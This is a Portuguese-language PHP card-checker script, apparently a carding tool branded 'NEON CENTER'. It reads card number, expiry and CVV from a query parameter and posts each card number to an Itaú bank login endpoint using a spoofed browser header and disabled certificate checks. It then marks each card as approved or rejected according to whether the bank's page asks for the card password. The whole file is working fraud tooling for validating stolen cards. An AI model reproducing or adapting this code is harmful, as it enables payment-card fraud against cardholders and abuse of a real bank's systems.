<?php
error_reporting(0);
DeletarCookies();

function DeletarCookies()
{
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

switch ($ano) {
    case '2021':
        $ano = '21';
        break;
    case '2022':
        $ano = '22';
        break;
    case '2023':
        $ano = '23';
        break;
    case '2024':
        $ano = '24';
        break;
    case '2025':
        $ano = '25';
        break;
    case '2026':
        $ano = '26';
        break;
    case '2027':
        $ano = '27';
        break;
    case '2028':
        $ano = '28';
        break;
}

#====================================================================================================#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://internetnc2.itau.com.br/router-app/router');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: internetnc2.itau.com.br',
    'Connection: keep-alive',
    'Origin: https://internetnc.itau.com.br',
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer: https://internetnc.itau.com.br/router-app/router',
    'Accept-Language: pt-BR,pt;q=0.9'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'portal=005&pre-login=pre-login&destino=&tipoLogon=9&usuario.cartao='.$cc.'&usuario.cpf=');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$est3Dgate = curl_exec($ch);

if(strpos($est3Dgate, 'senha do cart&atilde;o')){
    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-success">[ Cartão Valido! ]</span> | <span class="badge badge-dark">[ NEON CENTER ]</span></br>';
} else {
    echo '<span class="badge badge-danger"> Reprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-danger">[ Cartão Invalido! ]</span> | <span class="badge badge-dark">[ NEON CENTER ]</span></br>';
}